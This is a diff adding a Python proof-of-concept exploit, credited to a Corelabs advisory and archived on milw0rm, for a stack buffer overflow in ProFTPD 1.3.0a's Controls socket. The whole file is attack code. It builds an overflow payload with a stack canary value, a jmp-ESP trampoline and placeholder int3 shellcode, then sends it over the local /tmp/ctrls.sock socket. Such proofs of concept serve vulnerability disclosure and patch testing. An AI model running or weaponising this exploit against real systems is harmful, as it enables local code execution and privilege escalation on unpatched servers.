@@ -1,0 +1,41 @@
+#    Core Security Technologies - Corelabs Advisory
+#    ProFTPD Controls buffer overflow
+
+import socket
+import os, os.path,stat
+
+#This works with default proftpd 1.3.0a compiled with gcc 4.1.2 (ubuntu edgy)
+#
+ctrlSocket = "/tmp/ctrls.sock"
+mySocket = "/tmp/notused.sock"
+canary = "\0\0\x0a\xff"
+trampoline = "\x77\xe7\xff\xff" # jmp ESP on vdso
+shellcode = "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc" # inocuous "int 3"
+
+#Build Payload. The format on the stack is:
+#
+#AAAA = EBX BBBB = ESI CCCC = EDI DDDD = EBP EEEE = EIP
+payload = ("A"*512) + canary + "AAAABBBBCCCCDDDD" + trampoline + shellcode
+
+#Setup socket
+#
+if os.path.exists(mySocket):
+       os.remove(mySocket)
+s = socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
+s.bind(mySocket)
+os.chmod(mySocket,stat.S_IRWXU)
+s.connect(ctrlSocket)
+
+#Send payload
+#
+s.send("\1\0\0\0")
+s.send("\1\0\0\0")
+l = len(payload)
+s.send(chr(l & 255)+chr((l/255) & 255)+"\0\0")
+s.send(payload)
+
+#Finished
+#
+s.close()
+
+# milw0rm.com [2006-12-13]
